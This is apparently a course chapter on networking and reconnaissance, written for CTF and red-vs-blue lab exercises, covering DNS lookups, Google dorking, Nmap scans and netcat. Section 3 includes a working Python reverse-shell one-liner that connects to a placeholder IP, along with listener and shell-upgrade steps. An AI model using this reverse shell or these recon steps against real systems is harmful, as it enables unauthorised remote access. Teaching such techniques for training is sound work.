# Chapter 6: Networking & Reconnaissance

## Core Concepts & Definitions
**Networking** is how computers talk. **Reconnaissance** is gathering intelligence before an attack.

**Key Terminology:**
*   **IP Address:** The logical address of a machine (`192.168.1.1`).
*   **Protocol:** The rules of communication (TCP, UDP, ICMP).
*   **WHOIS:** A database of domain owners and registration details.
*   **DNS (Domain Name System):** The "Phonebook" of the internet, mapping names (`google.com`) to IPs.

---

## Section 1
**Goal:** Gather information without triggering alerts on the target.

### 1.1 Passive Recon & OSINT
*   **Google Dorking:** Use `intitle:"index of" "parent directory"` to find exposed file listings.
*   **Shodan:** The search engine for IoT devices. Find exposed webcams, routers, and industrial controllers.

### 1.2 DNS Investigation
*   **Dig & NSLookup:**
    *   `dig target.com A`: Find the IPv4 address.
    *   `dig target.com MX`: Find the mail servers (useful for phishing/social engineering recon).
    *   `nslookup -type=txt target.com`: Often contains verification codes or hidden flags in CTFs.

### Practice 1.1: The DNS Detective
**Scenario:** Investigate `megacorp.com`.
1.  Run `nslookup -type=any megacorp.com`.
2.  Find the `TXT` records.
3.  Look for a flag like `CTF{DNS_RECORDS_ARE_PUBLIC}`.

**Challenge Question 1:** What does the `ttl` (Time to Live) value in a DNS record represent?

---

## Section 2
**Goal:** Map the network and detect services using Nmap.

### 2.1 The Nmap Flag Table
| Flag | Name | Function |
|---|---|---|
| `-sS` | SYN Scan | Half-open scan. Fast and stealthy. |
| `-sV` | Version | Probes open ports to determine service versions. |
| `-sC` | Script | Runs default Nmap scripts (vulnerability detection). |
| `-p-` | All Ports | Scans every possible port (1-65535). |
| `-A` | Aggressive | Combines OS detection, versioning, and scripting. |

### Practice 2.1: Profiling the Target
**Scenario:** IP `10.10.10.5`.
1.  Run `nmap -T4 -A 10.10.10.5`.
2.  Analysis: If port `445` is open with `samba`, search for "EternalBlue" exploit.

### Practice 2.2: IoT Reconnaissance
**Scenario:** An unknown IoT device is active on your local network (`localhost:3000`).
1.  **Scan**: Use `nmap -sV -p 3000 localhost` to identify the service.
2.  **Fingerprint**: Can you determine if it's a web server or a custom protocol?
3.  **Analyze**: Look for the `/api/readings` endpoint. What format is the data in?

**Challenge Question 2:** Why is a "Stealth SYN Scan" (`-sS`) considered stealthy compared to a full TCP Connect scan (`-sT`)?

---

## Section 3
**Goal:** Establish Command & Control and transfer files with Netcat.

### 3.1 Netcat File Transfers
Netcat isn't just for shells; it's a fast way to move data.
*   **Receiver:** `nc -l -p 1234 > received_file.zip`
*   **Sender:** `nc [IP] 1234 < file_to_send.zip`

### 3.2 The Reverse Shell (Industrial Strength)
*   **Python One-Liner:**
    ```python
    python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[IP]",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
    ```
*   **Why use this?** It spawns a fully interactive PTY (pseudo-terminal), allowing things like `sudo` and `vim` to work inside the shell.

### Practice 3.1: Upgrading your Shell
**Task:** Turn a basic Netcat shell into a "pro" shell.
1.  Attacker: `nc -lvnp 4444`.
2.  Victim: Connects back with the Python one-liner above.
3.  Attacker: Inside the shell, run `CTRL+Z` -> `stty raw -echo; fg` -> `reset`.
4.  **Result:** You now have TAB-completion and a clearable screen!

### Practice 3.2: Live Dashboard Monitoring
**Scenario:** You are the Blue Team analyst for a smart city project.
1.  **Launch**: Start the IoT Red vs Blue dashboard at `http://localhost:3001`.
2.  **Simulate**: Use `node malicious_node.js` from the project simulator to launch an attack.
3.  **Detect**: Can you see the spike in traffic on the real-time chart?
4.  **Respond**: Use the dashboard's "Isolation" feature to block the malicious node's IP.

**Challenge Question 3:** What is a "Static Binary" and why do hackers use static versions of tools like `nmap` or `socat` during post-exploitation?

---

## Academic Connection & Competition
- **Textbook Correlation**: This chapter corresponds to **Chapter 6** and **Chapter 8 (Foundations)** of the [Consolidated Textbook](file:///Users/yoga/Documents/WorkDesk/CyberHack/Cyber_Security_Textbook.pdf).
- **Practical Application**: The real-time monitoring and IP isolation tools in the [IoT Blue Dashboard](file:///Users/yoga/Documents/WorkDesk/CyberHack/projects/IoT_Red_Blue/docs/Part_E_Guide.md) are critical for securing connected devices.
- **Competition Note**: Successfully isolating the Red Team's IP via the dashboard scores 15 points.

